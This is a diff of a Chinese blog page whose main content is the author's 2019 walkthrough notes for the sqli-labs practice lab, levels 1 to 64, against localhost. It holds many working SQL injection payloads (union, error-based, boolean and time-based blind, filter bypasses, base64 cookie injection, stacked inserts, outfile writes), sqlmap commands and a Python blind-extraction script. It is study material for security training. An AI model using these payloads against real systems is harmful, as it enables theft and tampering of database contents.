@@ -6,19 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Tag: -刷题记录 | B1ind&#39;s blog</title>
+  <title>sqli | B1ind&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="搭博客好难啊">
-<meta name="keywords" content="web">
-<meta property="og:type" content="website">
-<meta property="og:title" content="B1ind&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/tags/刷题记录/index.html">
+  <meta name="description" content="当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在也找到了一点自信，感觉自己是一名真正的脚本小子了。。。还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。">
+<meta name="keywords" content="-刷题记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli">
+<meta property="og:url" content="http://yoursite.com/2019/05/23/sqli/index.html">
 <meta property="og:site_name" content="B1ind&#39;s blog">
-<meta property="og:description" content="搭博客好难啊">
+<meta property="og:description" content="当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在也找到了一点自信，感觉自己是一名真正的脚本小子了。。。还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。">
 <meta property="og:locale" content="中文">
+<meta property="og:updated_time" content="2019-05-23T07:37:23.955Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="B1ind&#39;s blog">
-<meta name="twitter:description" content="搭博客好难啊">
+<meta name="twitter:title" content="sqli">
+<meta name="twitter:description" content="当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在也找到了一点自信，感觉自己是一名真正的脚本小子了。。。还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。">
   
     <link rel="alternative" href="/atom.xml" title="B1ind&#39;s blog" type="application/atom+xml">
   
@@ -158,36 +159,225 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-sqli" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      sqli
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/23/sqli/" class="archive-article-date">
+
+        
+        <a href="/2019/05/23/sqli/" class="archive-article-date">
   	<time datetime="2019-05-23T06:59:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-23</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/23/sqli/">sqli</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>当初刷sqli的记录了，同样的随心所欲，我也不知道为啥，总是不喜欢打标点符号，感觉空格更舒服<br>其实说真的，刷完sqli才感觉自己web安全入门了，真正的感受到了一些漏洞点的存在<br>也找到了一点自信，感觉自己是一名真正的脚本小子了。。。<br>还是得脚踏实地，枯燥系统的刷题，才能更好的理解这些漏洞点的存在，嗯，就是这样。</p>
+<a id="more"></a>
+<ol>
+<li><p>第1题<br>一看有回显  而且输入id=1’会报错，果断联合查询  居然没有任何过滤。。但是注意一点  联合查询的时候<br><strong><code>?id=&#39; union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23</code></strong><br>括号内的select不能删 。。。。<br><strong>然后补充几点新知识注释： –+      –%20     %23(#的编码)常见注释 %20 -&gt; （空格）%22 -&gt; “%23 -&gt; #%25 -&gt; %%27 -&gt; ‘</strong></p>
+</li>
+<li><p>第2题<br>同T1</p>
+</li>
+<li><p>第3题<br>看回显<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</code><br>这可还行  显然要闭合（ 了 ，闭合完之后就是正常操作了 <strong>发现一个新东西 group_concat(username,’—-‘,password) from users)居然是键值对的形式返回的 Dumb—-Dumb,Angelina—-I-kill-you,Dummy----p@ssword……..</strong></p>
+</li>
+<li><p>第4题<br>‘不报错  ”报错  而且还爆出（）  于是一眼看出这是用”闭合。然后又是一顿联合注入</p>
+</li>
+<li><p>第5题<br>由于它只有一个回显说 you are in…  说明它只能bool注入  或者时间盲注了sqlmap一跑  就OK  </p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; --dbs</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security --tables</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security -T users --columns</span><br><span class="line"> python2 sqlmap.py -u &quot;http://127.0.0.1/sqli/Less-5/?id=1&quot; -D security -T users -C password --dump</span><br></pre></td></tr></table></figure>
+<p> 后来发现   这个其实是报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;union select count(*),1, concat(&apos;~&apos;,(select database()),&apos;~&apos;,floor(rand(14)*2))a from information_schema.tables group by a--+</span><br></pre></td></tr></table></figure></p>
+<p>详情看笔记mysql报错注入原 理分析</p>
+<ol start="6">
+<li><p>第6题<br>用”闭合的bool注入 因为在id=1后加上’不报错  加上”报错  说明这个是”闭合 我们只需要在sqlmap上加入–level  3   这个参数即可  这个参数可以自动检验”的闭合情况这其实是”双引号闭合的报错注入</p>
+</li>
+<li><p>第7题<br>这个题目说了用outfile导出文件     这里有一篇巨好的文章<a href="https://www.jianshu.com/p/7b9256de20d1这个首先闭合就是由一定的坑" target="_blank" rel="noopener">https://www.jianshu.com/p/7b9256de20d1这个首先闭合就是由一定的坑</a>  首先  ?id=1    ?id=1’   ?id=1”发现只有单引号报错   于是一定要用单引号闭合   但是?id=1’ –+ 还是报错我认为  有两种可能<br>1、闭合不到位<br>2、注释符号被过滤<br>事实证明  是闭合不到位  我们疯狂加))来闭合   发现?id=1’))–+不报错好了  闭合完成接下来开始写<br><strong><code>?id=1&#39;)) union select * from users into outfile &quot;D:\\1.txt&quot;--+</code></strong><br>发现写不进去    两个原因1. 第1题<br>在执行sql语句的用户权限不够<br><strong><strong><code>?id=1&#39;)) and (select count(*) from mysql.user)&gt;0--+</code></strong></strong><br>这个重要发现不报错  忽略这个原因<br>2、那么就是 secure_file_priv 这个东东的问题了</p>
+</li>
+<li><p>第8题<br>这就是bool盲注  没得讲</p>
+</li>
+<li><p>第9题<br>这个用’  “ 闭合都不报错  然后?id=1’ and sleep(2)–+ 发现会延时  所以就是 时间盲注 and if((length(database())&gt;5),sleep(5),0)但是果断还是sqlmap来跑</p>
+</li>
+<li><p>第10题<br>基于双引号闭合的时间盲注</p>
+</li>
+<li><p>第11题<br>基于post注入的联合查询注入把  反正我联合查询查出来了<br><strong><code>uname=1&#39; union select (select group_concat(column_name) from information_schema.columns where table_name = &quot;users&quot;),3%23&amp;passwd=1&amp;submit=Submit</code></strong><br>好了  报错注入也可以<br><strong><code>uname=1&#39; union select count(*),concat(database(),&#39;~&#39;,floor(rand(14)*2))a from information_schema.tables group by a%23 &amp;passwd=1&amp;submit=Submit</code></strong></p>
+</li>
+<li><p>第12题<br>与上题一样   但是闭合需要用   “)   然后联合或者报错了</p>
+</li>
+<li><p>第13题<br>这个题的特点是它只会告诉你是登陆成功与sql查询报的错误   所以用 ‘)闭合之后一顿报错 ，当然  我猜它bool注入也没有问题</p>
+</li>
+<li><p>第14题<br>先套出来它是双引号闭合  然后发现它还是能报错注入。。。。。</p>
+</li>
+<li><p>第15题<br>这个题不能报错注入  但是它至少会告诉你登陆成功还是失败  所以可以bool注入<br><strong><code>uname=1&#39; or 1=1%23&amp;passwd=1&amp;submit=Submit</code></strong><br>sqlmap是真的用不习惯，这里奉上脚本    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests,datetime</span><br><span class="line">url = &quot;http://127.0.0.1/sqli/Less-15/&quot;</span><br><span class="line">char = &quot;abcdefghijklmnopqrstuvwxyz_&quot;</span><br><span class="line">for i in range(0,10):</span><br><span class="line">    database = &quot;&quot;</span><br><span class="line">    for j in range(1,20):</span><br><span class="line">        for str in char:</span><br><span class="line">            # print(str)</span><br><span class="line">            time1 = datetime.datetime.now()</span><br><span class="line">            data = &#123;&apos;uname&apos;:&quot;admin&apos;and If((mid((select schema_name from information_schema.schemata limit %d,1),%d,1))=&apos;%s&apos;,1,sleep(2))#&quot;%(i,j,str),&apos;passwd&apos;:&quot;1&quot;&#125;</span><br><span class="line">            res = requests.post(url,data=data)</span><br><span class="line">            # print(res.text)</span><br><span class="line">            time2 = datetime.datetime.now()</span><br><span class="line">            sec = (time2 - time1).seconds</span><br><span class="line">            if sec&lt;=1:</span><br><span class="line">                database += str</span><br><span class="line">                print(database)</span><br><span class="line">                break</span><br><span class="line">    print(&quot;the %d database: &quot;%i)</span><br><span class="line">    print(database)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第16题<br>双引号闭合的bool注入   上述脚本改改就OK了</p>
+</li>
+<li><p>第17题<br>这个题提示是update ，确实不会  我感觉其实有可能会 但是就是出错  包括用别人的payload都会报错  真是怪了这个题目坑就坑在：<br>1、 uname被过滤处理了  基本无法注入<br>2、 而password在update语句中，所以不能union select<br>然后才知道  除了联合查询  其实还可以or语句    像update   delete  insert  都是用 or语句连接查询语句这个注入还挺复杂   简书上有篇文章介绍的很详细很详细</p>
+</li>
+<li><p>pass</p>
+</li>
+<li><p>pass</p>
+</li>
+<li><p>pass</p>
+</li>
+<li><p>第21题<br>中间有几个题目发现按照wp来也实现不了  先跳过这题提示是cookies注入   首先账号密码被我套admin与1给套进去了   然后弹出的界 面有cookie值  cookie值有uname 这一选项  后面是一套base64编码的值 就是admin的base64编码  猜测后台根据cookie中的值查询数据库  再与提交的password进行比对 于是我们可以直接在cookie中的uname上面进行注入   当然  需要base64编码。联合查询的payload：  <strong><code>MScpIHVuaW9uIHNlbGVjdCAoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSwnLS0nLHBhc3N3b3JkKSBmcm9tIHVzZXJzKSwxLDEj</code></strong><br>还可以报错注入：<strong><code>MScpIHVuaW9uIHNlbGVjdCBjb3VudCgqKSwxLCBjb25jYXQoJ34nLChzZWxlY3QgZGF0YWJhc2UoKSksJ34nLGZsb29yKHJhbmQoMTQpKjIpKWEgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIGdyb3VwIGJ5IGEj</code></strong></p>
+</li>
+<li><p>第22题<br>只是把单引号换成双引号payload：        YWRtaW4iIHVuaW9uIHNlbGVjdCAzLGRhdGFiYXNlKCksNCBsaW1pdCAxLDIj</p>
+</li>
+<li><p>第23题<br>这个题目回到了get注入  很爽    根据报错可以知道  注释符号被过滤了 我当时看到 mysql_fetch_array() 我还以为有空字节截断漏 洞  后来知道我记错了  要用最简单的 or 1=’1 去闭合后一个单引号我基本做出来了  就是有一个问题   它后面有一个limit 0,1 我们联合查询的结果无法显示出来  这一点把我弄懵逼了  事实上  方法很简单              直接把id=1改成一个错误的id=10000就行</p>
+</li>
+<li><p>第24题<br>讲道理  这题完全不会  因为没有头绪  这个题设计得很好  有登陆  改密码  注册界面              首先要结合代码审计 判断出来 只有注册界面的username没有被过滤  而且完全没有被过滤  其余全被过滤了  很不好注入            新姿势  二次注入 ：首先把设 计好的代码放到数据库中存好  然后在通过其他手段触发它比如这一题  我们首先通过注册没有过滤这一弱点  将我们想存的东西存进去  我们准备在修改密码的时候进行攻击  于是我们注册一个 用户名为admin’– 的用户（密码随意）然后在修改密码的界面对它进行修改这时候修改的其实是admin用户的密码   然后你就可以用修改后的密码去登陆admin账户了</p>
+</li>
+<li><p>第25题<br>这个题刚开始还吓我一跳  经过测试  发现只是or  与 and  被过滤了而已  注释符都没有被过滤  这个就直接联合查询注入就行?id=1’ union select 1,database(),3 limit 1,2%23突然发现还可以anandd  oorr这样绕过   小意思wp说还可以&amp;&amp;  || 绕过……</p>
+</li>
+</ol>
+<p>25a、这题更加简单  但是加’  或 “ 都报错  于是这是整数型注入   我还以为是什么很难的东西   结果就是不需要闭合而已  天啊 浪费我心情  不用闭合  与上题一样。</p>
+<ol start="26">
+<li>第26题<br>这个题把注释符与空格给过滤了  而且还不是一次性过滤  不能用2个空格给绕过  于是首先想到/**/代替空格  但是没有想到这个东西 也被过滤了   还试了试括号来代替空格  但是还是有一些问题 没办法  看wp吧   有3条思路 ：  第一种需要在linux上实现   就是使 用特殊的URL编码来代替空格</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">* %09 TAB 键（水平）</span><br><span class="line">       * %0a 新建一行</span><br><span class="line">       * %0b TAB 键（垂直）</span><br><span class="line">       * %0c 新的一页</span><br><span class="line">       * %0d return 功能</span><br><span class="line">       * %a0 空格</span><br></pre></td></tr></table></figure>
+<p>这些url特殊编码可以拿来绕过 但是windows下不支持第二种很厉害：充分运用括号与||来代替空格  使用updataxml函数进行报错注入  这个主要是可以直接用||执行函数 所以可以不用空格payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8088/sqlilabs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;,(database())),0)||&apos;1&apos;=&apos;1    http://localhost:8088/sqlilabs/Less-26/?id=0&apos;||updatexml(1,concat(&apos;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&apos;security&apos;))),0)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<p>发现没有   union select  中间的空格是避免不了的  但是其他的可以用括号绕过。第三种也很厉害：构造没有空格的盲注语句如：<br><strong><code>id=1&#39;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#39;1&#39;=&#39;</code></strong><br>也是充分运用了括号进行绕过（注意  information变成了infoorrmation 因为or被过滤）</p>
+<p>26a、这个题我判断的是’闭合但是没法进一步判断有没有()  注意注意  新姿势来了  两种方法查看是否有（）闭合</p>
+<pre><code>1. 2&apos;&amp;&amp;&apos;1&apos;=&apos;1
+</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 若查询语句为where id=&apos;$id&apos;，查询时是where id=&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;，结果是where id=&apos;2&apos;，回显会是id=2。</span><br><span class="line"></span><br><span class="line">        * 若查询语句为where id=(&apos;$id&apos;)，查询时是where id=(&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;)，MySQL 将&apos;2&apos;作为了 Bool 值，结果是where id=(&apos;1&apos;)，回显会是id=1。</span><br></pre></td></tr></table></figure>
+<pre><code>1. 1&apos;)||&apos;1&apos;=(&apos;1若查询语句有小括号正确回显，若无小括号错误回显（无回显）。
+</code></pre><p>发现需要用()闭合  然后就和26一样了   （但是它关闭了错误回显  所以不能用报错注入）</p>
+<ol start="27">
+<li>第27题<br>其实挺简单  主要是需要代码审计  它过滤很不严格  过滤了空格  注释  但是select  与 Union 过滤不严格  居然可以随机大小写绕 过 于是它和26一样3种解法</li>
+</ol>
+<p>27a、”闭合的27题</p>
+<ol start="28">
+<li>第28题<br>首先试出来要用’)来闭合  但是updatexml报错注入失败了  应该是关掉了错误回显发现bool盲注是可以成功的其次  特殊url编码依旧可以绕过空格过滤28a、闭合还是’)     bool注入还是没问题  好像还可以多写来绕过</li>
+</ol>
+<p>29-31. 第29-31题<br>这个是双服务器  需要搭建tomcat来解析jsp文件  再通过tomcat去访问apache来获取数据库信息返回给客户   此时 tomcat 其实起的是一个WAF的作用  真正与数据库交互还是在apache上  但是我tomcat配置好了但是好像sqli下载的时候出问题了  没发现jsp文件。。。<a href="http://localhost:8080/sqlilabs/Less-29/?id=1&amp;id=2&#39;这个就是payload了" target="_blank" rel="noopener">http://localhost:8080/sqlilabs/Less-29/?id=1&amp;id=2&#39;这个就是payload了</a>  tomcat只检查第一个id  而  apache看后一个id所以我们在 后一个id中注入</p>
+<ol start="32">
+<li><p>第32题<br>发现题目只是把’  “  过滤了  首先想到宽字节注入  结果。。。我不知道为啥  我以前笔记里的宽字节注入用不上  wp里的宽字节真好用….算是学习了   但是发现一点问题  我看这个网页的head里面明明是utf-8编码呀  怎么会这样。。。。</p>
+</li>
+<li><p>第33题<br>和32一模一样  只是32用的是自己写的函数过滤  33用的是php自带的 addslashes()</p>
+</li>
+<li><p>第34题<br>又是post   又得打开Burp  有点烦。。这个题我没有看wp  我只是试了一下宽字节注入  发现存在注入点  但是没有错误回显  但是可 以bool注入  反正username就存在注入点uname=admin%bb%27 or 1 limit 1,2%23&amp;passwd=1&amp;submit=Submit可以改变limit实现平行越权 注入  当然bool注入也可以</p>
+</li>
+<li><p>第35题<br>这题有毒吧   测试发现’  “被转义  而且宽字节注入无效   我还以为有其它骚姿势  结果这是整型注入  不需要闭合。。。<br>而没有错误回显时，我们又应该怎么判断是数字型注入还是引号被过滤呢？在能分辨出正确回显和错误回显（有固定字符串）时，id=1正确回显，尝试id=1’和id=1”：</p>
+<ul>
+<li><strong><code>若两者都正确回显：很可能是被过滤引号</code></strong></li>
+<li><strong><code>若两者都错误回显：很可能是数字型查询</code></strong></li>
+<li><strong><code>若一正确一错误：基本可确定是字符型查询</code></strong></li>
+</ul>
+</li>
+<li><p>第36题<br>可以发现’  “  被转义  然后直接宽字节  ok目前发现  mysql需要将语言设置为GBK才能完全防范宽字节注入   <strong>Mysql_set_charset(‘gbk’,’$conn’)</strong>还有就是   mysql_real_escape_string(),addslashes()这些转义函数都会被宽字节注入</p>
+</li>
+<li><p>第37题<br>又是一个普通的宽字节注入  真是醉了  但是这个怎么只有两个字段了。。。payload：  uname=-11%bb%27 union select 1,database()%23&amp;passwd=1&amp;submit=Submit</p>
+</li>
+<li><p>第38题<br>莫名奇妙注入成功了。。。。真是有毒  啥也不过滤 不过后来发现   这是堆叠注入  也就是说  在参数后面来一个   ;  然后开始第二个sql语句  这样既可以拿shell  又可以做一些其他的事</p>
+</li>
+<li><p>第39题<br>与38不同的就是整型注入</p>
+</li>
+<li><p>第40题<br>可以直接盲注  用’)闭合</p>
+</li>
+<li><p>第41题<br>整型的40题38-41   其实主要考察堆叠注入   我们可以用堆叠注入空造一个账号  也可以删库跑路  导出一句话 。</p>
+</li>
+<li><p>第42题<br>网上说是堆叠注入  但是网上的payload我用不了  不知道为啥 ？？？？？？？？？？？？但是password是有注入点的   直接闭合后可 以联合查询注入</p>
+</li>
+<li><p>第43题<br>与42不同的地方是’)闭合</p>
+</li>
+<li><p>第44题<br>这个题目有意思  它没有报错回显  只有登录成功与登录失败  我发现password=2可以  2’  2”都不行 刚开始还以为是注入整型注入   结果。。。。<br>当 POST 没有报错回显时，判断查询语句就需要构造永真条件同化登录失败与查询出错，通过返回的图片不同来确定是否符合查询语句闭合的条件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login_user=admin&amp;login_password=1 or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&apos; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot; or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&apos;) or 1=1--+</span><br><span class="line">login_user=admin&amp;login_password=1&quot;) or 1=1--+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>所以要这样一套尝试才行。。。</p>
+<ol start="45">
+<li><p>第45题<br>与44不同在于’)闭合</p>
+</li>
+<li><p>第46题<br>这个题让你添加一个叫sort的get参数   然后数字是几  就按照第几排排序<br>这个主要出现在一些有表格的网页中  网页中如果带有order  sort  等参数就可以用到<br>sort=1 asc升序     sort=1 desc降序  通过这个可以判定这个是注入点<br>我们发现   sort在1,2,3的时候正确  其他情况下会报错  于是我们想到可以bool注入<br>但是问题来了   sort=(select 1)  与  sort=(select 0)的情况居然一样<br>然后  wp说  试试rand()函数  发现sort=rand(1)  与  sort=rand(0)的情况不一样<br>所以就可以bool注入<br><strong><code>http://localhost:8088/sqlilabs/Less-46/?sort=rand((ascii(mid((select database()),1,1)))&gt;65)</code></strong></p>
+</li>
+</ol>
+<p>还有一种办法   就是基于双注入的报错注入  （order by 只能接一个字段  所以要派生表）<br><strong><code>http://localhost:8088/sqlilabs/Less-46/?sort=(select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)</code></strong></p>
+<ol start="47">
+<li>第47题<br>与46题不同的在于需要单引号闭合  我真是有点蒙  这个order by 居然也能单引号闭合  不过他有报错提升  显然  报错注入稳了<br><strong><code>?sort=1&#39; and (select 1 from (select count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand(14)*2))as a from information_schema.tables group by a) b)--+</code></strong></li>
+</ol>
+<p>还有  很牛批的outfile导出函数可以使用<br><strong><code>?sort=1&#39; into outfile &quot;C:\\ProgramData\\MySQL\\MySQL Server 5.7\\Uploads\\data.txt&quot;--+</code></strong></p>
+<p>包括盲注<br><strong><code>?sort=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(0.1),0)--+</code></strong></p>
+<ol start="48">
+<li><p>第48题<br>发现sort=0的时候页面会变黑  没有错误提示  那么报错注入是没戏了<br>这样的话bool注入就有戏了。<br>而且outfile   时间盲注都可以</p>
+</li>
+<li><p>第49题<br>只是要闭合单引号的48题  时间盲注  oufile</p>
+</li>
+<li><p>第50题<br>可以堆叠注入<br><strong><code>?sort=1;insert into users(id,username,password) values(50,&#39;Less50&#39;,&#39;Less50&#39;)--+</code></strong><br>也可以像46题一样的注入<br>一般后台查询数据库使用的语句都是mysql_query()，<br>而可以堆叠注入的后台使用的是mysqli_multi_query()。</p>
+</li>
+<li><p>第51题<br>单引号闭合的50题<br>?sort=1’;insert into users values(49,’1’,’1’);–+</p>
+</li>
+<li><p>第52题<br>可以直接堆叠注入  只是说没有错误回显 不能报错注入了而已   bool   盲注啥的都行</p>
+</li>
+<li><p>第53题<br>单引号闭合的52题</p>
+</li>
+</ol>
+<hr>
+<h2 id="挑战题"><a href="#挑战题" class="headerlink" title="挑战题"></a>挑战题</h2><ol start="54">
+<li><p>第54题<br>没有过滤  不好意思  一套联合查询注入搞定了</p>
+</li>
+<li><p>第55题<br>卧槽  这个题目真的有毒   首先它没有报错回显<br>我试id=1可以   id=1’  1”  都不行  所以我就判断是整型注入<br>然后发现  1 and 1=1  可以  1 and 1=2  不行<br>卧槽  这妥妥的整型注入漏洞呀<br>但是  id=-1 union select 1,2,3 就是不行  真是崩溃了<br>wp上说  还有一种叫小括号闭合型整型注入  我的妈耶  这么复杂<br>果然id=1)失败  id=1)–+ 成功<br>真是有毒   然后一套联合查询注入就OK了</p>
+</li>
+<li><p>第56题<br>单引号加小括号的闭合</p>
+</li>
+<li><p>第57题<br>双引号闭合的注入</p>
+</li>
+<li><p>第58题<br>有回显   单引号闭合的报错注入<br>不能联合查询   因为好像数据被排序后输出的</p>
+</li>
+<li><p>第59题<br>这题是整型注入  但是  怎么会双注入不报错呢？？？？？？  好生奇怪</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;challenges&apos;),0x7e))--+</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>这个payload倒是报错了。。。。。<br>真的奇怪  太奇怪了</p>
+<ol start="60">
+<li><p>第60题<br>可以从回显看出来是”)闭合   但是卧槽  又是只能extractvalue函数报错  真是奇怪</p>
+</li>
+<li><p>第61题<br>‘))闭合  还是得extractvalue真是活见鬼</p>
+</li>
+<li><p>第62题<br>没有回显  无法联合查询  ‘)闭合成功  看了就是bool注入了</p>
+</li>
+<li><p>第63题<br>‘闭合的bool注入</p>
+</li>
+<li><p>第64题<br>“)闭合的bool注入</p>
+</li>
+</ol>
 
-        <div class="article-info info-on-right">
-          
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>这可能是个隐写，要不你扫扫？<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -199,57 +389,119 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/05/23/sqli/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/05/22/实验吧刷题记录/" class="archive-article-date">
-  	<time datetime="2019-05-22T12:05:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-05-22</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/05/22/实验吧刷题记录/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">实验吧刷题记录</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/05/22/实验吧刷题记录/">实验吧刷题记录</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">-刷题记录</a>
